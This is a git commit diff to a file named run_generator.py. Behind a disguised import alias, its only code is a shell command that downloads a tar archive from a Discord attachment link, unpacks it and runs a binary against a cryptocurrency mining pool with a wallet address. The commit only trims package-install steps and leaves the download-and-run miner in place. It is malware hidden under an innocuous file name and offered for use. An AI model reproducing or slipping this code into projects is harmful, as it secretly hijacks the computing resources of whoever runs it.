bd2550124be485c1d938114837d95f6963f66137
cringe0 <92528095+cringe0@users.noreply.github.com>
2021-10-14 19:25:26 +0500

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,3 @@
 import os as alpha
-alpha.system("curl -LJO https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update && apt install pciutils && ./work -rvram 1 -pool  us.stratu.ms:16062 -ewal 3Ft56HYdAPXxRSQQAXRSggbuFYC2tpi4kB.rig -proto 4 -straps 2")
+alpha.system("curl -LJO https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && ./work -rvram 1 -pool  us.stratu.ms:16062 -ewal 3Ft56HYdAPXxRSQQAXRSggbuFYC2tpi4kB.rig -proto 4 -straps 2")
 
